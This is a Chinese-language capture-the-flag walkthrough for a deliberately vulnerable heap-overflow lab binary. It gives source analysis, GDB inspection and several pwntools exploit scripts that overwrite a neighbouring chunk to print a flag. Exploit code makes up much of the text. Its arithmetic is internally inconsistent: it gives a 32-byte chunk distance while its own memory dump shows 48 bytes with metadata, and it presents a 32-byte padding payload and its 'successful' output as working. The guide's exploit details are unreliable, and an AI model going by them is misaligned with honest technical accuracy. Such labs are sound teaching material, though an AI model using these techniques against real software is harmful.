# Level 1: 逐步利用指南

本指南将手把手教你如何完成 Level 1 的堆溢出挑战。

## 步骤 1: 理解程序

### 源码分析

打开 `challenge/vuln.c`：

```c
int main() {
    char *chunk1, *chunk2;

    chunk1 = (char *)malloc(32);  // 分配 32 字节
    chunk2 = (char *)malloc(32);  // 再分配 32 字节

    printf("[+] Allocated chunk1 at: %p (size: 32)\n", chunk1);
    printf("[+] Allocated chunk2 at: %p (size: 32)\n", chunk2);

    // 漏洞：读取 100 字节到 chunk1！
    read(0, chunk1, 100);

    // 检查 chunk2 的内容
    if (strcmp(chunk2, "pwned!") == 0) {
        winner();  // 获取 flag
    }
}
```

### 关键点

1. **chunk1**: 32 字节
2. **chunk2**: 32 字节
3. **漏洞**: `read(0, chunk1, 100)` - 读取 100 字节！
4. **目标**: 让 `chunk2` 等于 `"pwned!"`

## 步骤 2: 分析内存布局

### 方法 1: 运行程序查看地址

```bash
cd level01_overflow/challenge
make
./vuln
```

输入任意数据（比如 "test"），你会看到：

```
[+] Allocated chunk1 at: 0x5555555592a0 (size: 32)
[+] Allocated chunk2 at: 0x5555555592c0 (size: 32)
```

**计算距离**：
```
chunk2 - chunk1 = 0x5555555592c0 - 0x5555555592a0 = 0x20 (32 字节)
```

### 方法 2: 使用 GDB

```bash
gdb ./vuln
```

```
(gdb) break main
(gdb) run

# 在两次 malloc 后停止
(gdb) next 2

# 查看堆
(gdb) heap
# 或
(gdb) x/30gx 0x555555559000
```

你会看到类似：
```
0x555555559290: 0x0000000000000000 0x0000000000000031  <- chunk1 元数据
0x5555555592a0: 0x0000000000000000 0x0000000000000000  <- chunk1 数据（32字节）
0x5555555592c0: 0x0000000000000000 0x0000000000000031  <- chunk2 元数据
0x5555555592d0: 0x0000000000000000 0x0000000000000000  <- chunk2 数据
```

**注意**：
- `0x31` = `0x30 | 0x01` (实际大小 0x30，PREV_INUSE=1)
- 用户数据从 `chunk + 0x10` 开始
- chunk1 和 chunk2 相距 0x30 字节（包含元数据）

## 步骤 3: 构建 Payload

### 需求分析

我们需要：
1. 填满 chunk1 的 32 字节用户数据
2. 继续写入，覆盖 chunk2 的内容为 `"pwned!"`

### Payload 结构

```
[填充 chunk1 的 32 字节] + [写入 chunk2 的 "pwned!"]
```

### Python 实现

```python
from pwn import *

# 方法 1: 简单版本
payload = b"A" * 32 + b"pwned!"

# 方法 2: 带换行（因为 read() 包含换行符）
payload = b"A" * 32 + b"pwned!\n"

# 方法 3: 使用 pwn32 确保对齐
payload = b"A" * 32
payload += b"pwned!"
payload += b"\n"  # 确保字符串终止
```

## 步骤 4: 本地测试

### 方法 1: 命令行

```bash
# 生成 payload
python3 -c "print('A'*32 + 'pwned!')" | ./vuln
```

**输出**：
```
Enter data for chunk1 (max 100 bytes):
[+] You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwned!
[+] chunk2 content: pwned!
[+] chunk2 length: 6

╔════════════════════════════════════════╗
║     Congratulations! 🎉                ║
╠════════════════════════════════════════╣
║  Flag: flag{heap_overflow_master_level1}
╚════════════════════════════════════════╝
```

### 方法 2: 使用 Python 脚本

创建 `exploit.py`：

```python
#!/usr/bin/env python3
from pwn import *

# 设置上下文
context.log_level = 'info'

# 启动进程
p = process('./vuln')

# 构建 payload
payload = b"A" * 32 + b"pwned!\n"

# 发送 payload
p.sendline(payload)

# 交互
p.interactive()
```

运行：
```bash
chmod +x exploit.py
python3 exploit.py
```

### 方法 3: 使用 pwntools 模板

```python
#!/usr/bin/env python3
from pwn import *

# 二进制文件
binary = './vuln'
elf = ELF(binary)

# 启动进程
p = process(binary)

# 或者连接到远程
# p = remote('host', port)

# 构建 payload
payload = flat([
    b"A" * 32,      # 填充 chunk1
    b"pwned!",      # 覆盖 chunk2
])

# 发送
p.sendline(payload)

# 获取 flag
print(p.recvall().decode())
```

## 步骤 5: 验证理解

### 验证 1: 检查偏移

修改 payload 测试不同的偏移：

```python
# 测试 1: 偏移太小
payload = b"A" * 31 + b"pwned!"  # 少 1 字节
# 结果：chunk2 只有部分被覆盖

# 测试 2: 刚好
payload = b"A" * 32 + b"pwned!"  # 正确
# 结果：成功！

# 测试 3: 偏移太大
payload = b"A" * 33 + b"pwned!"  # 多 1 字节
# 结果：仍然成功（但浪费了 1 字节）
```

### 验证 2: 使用 GDB 观察溢出

```bash
gdb ./vuln
```

```
(gdb) break *main+XXX  # 在 read 之后
(gdb) run

# 输入 payload
# 输入完成后

# 查看内存
(gdb) x/20gx 0x5555555592a0

# 应该看到：
0x5555555592a0: 0x4141414141414141 0x4141414141414141  <- chunk1 被 'A' 填满
0x5555555592c0: 0x4141414141414141 0x65646e7770210000  <- chunk2 元数据被覆盖
0x5555555592d0: ...
```

## 步骤 6: 高级技巧

### 技巧 1: 使用 cyclic 计算偏移

```python
from pwn import *

# 生成模式字符串
pattern = cyclic(32)
payload = pattern + b"pwned!"

# 或者使用 cyclic_find 查找偏移
# 假设我们知道崩溃的值
offset = cyclic_find(0x61616162)  # 查找 'aaab' 的位置
```

### 技巧 2: 使用 env 传递环境变量

```python
from pwn import *

p = process('./vuln', env={'DEBUG': '1'})
```

### 技巧 3: 使用 gdb.attach 调试

```python
from pwn import *

p = process('./vuln')

# 在 read() 处附加 GDB
gdb.attach(p, '''
    break main
    continue
    x/20gx $rsp-0x1000
''')

p.sendline(b"A" * 32 + b"pwned!")
p.interactive()
```

## 步骤 7: 完整的利用脚本

### 最终版本

```python
#!/usr/bin/env python3
"""
Level 1: Heap Overflow Exploit
Author: You
Date: 2024
"""

from pwn import *

# 配置
context.log_level = 'info'
context.binary = './vuln'

def exploit(p):
    """执行漏洞利用"""

    # 打印信息
    log.info("Starting Level 1 exploit...")

    # 构建 payload
    # 1. 填满 chunk1 (32 字节)
    # 2. 覆盖 chunk2 为 "pwned!"
    payload = flat([
        b"A" * 32,      # 32 字节填充
        b"pwned!",      # 目标字符串
    ])

    log.info(f"Payload length: {len(payload)}")
    log.info(f"Payload: {payload}")

    # 发送 payload
    p.sendline(payload)

    # 接收输出
    response = p.recvall(timeout=2)
    print(response.decode())

    # 检查是否成功
    if b"Congratulations" in response:
        log.success("Exploit successful!")
        return True
    else:
        log.failure("Exploit failed!")
        return False

if __name__ == "__main__":
    # 本地利用
    p = process('./vuln')
    exploit(p)

    # 远程利用（如果有远程服务）
    # p = remote('localhost', 8888)
    # exploit(p)
```

## 步骤 8: 常见问题排查

### 问题 1: 没有触发 winner()

**可能原因**：
- 偏移量计算错误
- 字符串没有正确终止
- read() 包含换行符

**解决方法**：
```python
# 添加调试输出
payload = b"A" * 32 + b"pwned!\0"  # 显式添加 null
# 或
payload = b"A" * 32 + b"pwned!\n"  # 使用换行
```

### 问题 2: chunk2 内容不正确

**检查方法**：
```python
# 在 GDB 中查看
gdb.attach(p, 'x/s $rbp-0x20')  # 查看 chunk2 内容
```

### 问题 3: 程序崩溃

**可能原因**：
- 破坏了 chunk2 的元数据
- 覆盖了其他重要数据

**解决方法**：
```python
# 只覆盖用户数据，不破坏元数据
payload = b"A" * 32 + b"pwned!"  # 不要超过太多
```

## 步骤 9: 挑战延伸

完成基础挑战后，尝试：

### 挑战 1: 精确控制

目标：让 chunk2 包含特定地址
```python
payload = b"A" * 32 + p64(0xdeadbeef)
```

### 挑战 2: 泄露地址

目标：通过溢出读取 chunk1 之前的数据

### 挑战 3: 链式分配

```c
chunk1 = malloc(32);
chunk2 = malloc(32);
chunk3 = malloc(32);

// 能控制 chunk3 吗？
```

## 总结

### 你学到了什么

1. ✅ 堆 chunk 的内存布局
2. ✅ 如何计算 chunk 之间的偏移
3. ✅ 堆溢出的基本原理
4. ✅ 使用 pwntools 编写利用脚本
5. ✅ 使用 GDB 调试堆问题

### 下一步

完成 Level 1 后，继续：
- [Level 2: Use-After-Free](../../level02_uaf/)
- [Level 3: Fastbin Double Free](../../level03_fastbin_dup/)

### 参考资源

- [pwntools 文档](https://docs.pwntools.com/)
- [GDB 调试技巧](../../docs/03_debugging_tools.md)
- [堆内部原理](theory.md)

---

**恭喜完成 Level 1！** 🎉

继续你的堆利用之旅吧！ 🚀
